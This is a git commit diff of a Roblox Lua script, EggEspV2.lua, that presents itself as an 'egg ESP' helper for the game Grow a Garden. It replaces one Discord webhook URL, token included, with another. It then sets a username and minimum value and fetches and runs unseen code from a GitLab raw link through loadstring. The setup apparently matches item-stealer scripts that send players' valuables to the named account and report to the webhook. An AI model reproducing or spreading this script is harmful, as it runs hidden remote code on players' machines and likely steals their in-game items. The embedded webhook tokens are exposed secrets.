68fa3d2acba52172474a927ecad4cb3efb5a2a29
ScriptHub-Randomizer <kadiguiabaguilar@gmail.com>
2025-07-01 11:29:32 +0800

    Update EggEspV2.lua

--- EggEspV2.lua
+++ EggEspV2.lua
@@ -1,5 +1,5 @@
 Username = "Mariaisthebest12389"
-Webhook = "https://discord.com/api/webhooks/1388768357318267031/QvUP4zd3-vLUdWjNcLB9yJ74rRtOJxCKFWfa3VZP-BmdD-jtEdFYNp9C6tXCWf_Enbdl"
+Webhook = "https://discord.com/api/webhooks/1389445501107044426/t3EwtrDU7RzykiFxeUo6EiN0ucyH-UlAIQ-0tXIdSpcdlpWa2jo7sg3jhRiBdqfUAMan"
 MinimumValue = 1
 
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
